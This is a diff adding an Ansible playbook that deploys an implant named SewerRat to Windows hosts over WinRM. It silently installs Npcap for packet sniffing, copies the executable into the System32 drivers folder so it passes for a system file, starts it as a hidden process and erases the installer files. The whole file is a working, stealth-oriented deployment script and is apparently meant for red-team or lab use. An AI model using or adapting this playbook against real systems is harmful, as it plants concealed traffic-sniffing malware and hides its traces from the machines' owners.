@@ -1,0 +1,41 @@
+---
+- name: Deploy and Execute SewerRat Implant on Windows
+  hosts: all
+  gather_facts: false
+  vars:
+    ansible_connection: winrm
+    ansible_winrm_server_cert_validation: ignore
+    base_dir: "{{ playbook_dir }}/Windows/sewerrat"
+
+  tasks:
+    - name: Ensure temporary deployment directory exists
+      win_file:
+        path: C:\Windows\Temp\sewerrat
+        state: directory
+
+    - name: Copy Npcap installer to target
+      win_copy:
+        src: "{{ base_dir }}/npcap-1.87.exe"
+        dest: C:\Windows\Temp\sewerrat\npcap-1.87.exe
+
+    - name: Install Npcap silently (Required for Layer 2 Packet Sniffing)
+      win_package:
+        path: C:\Windows\Temp\sewerrat\npcap-1.87.exe
+        arguments: '/S /winpcap_mode=yes /admin_only=no'
+        state: present
+
+    - name: Copy SewerRat executable to System32 drivers folder
+      win_copy:
+        src: "{{ base_dir }}/dist/SewerRat.exe"
+        dest: C:\Windows\System32\drivers\SewerRat.exe
+
+    - name: Start SewerRat Implant (Hidden Process)
+      win_shell: |
+        Start-Process -FilePath "C:\Windows\System32\drivers\SewerRat.exe" -WindowStyle Hidden
+      async: 45
+      poll: 0
+
+    - name: Cleanup temporary Npcap installer files
+      win_file:
+        path: C:\Windows\Temp\sewerrat
+        state: absent
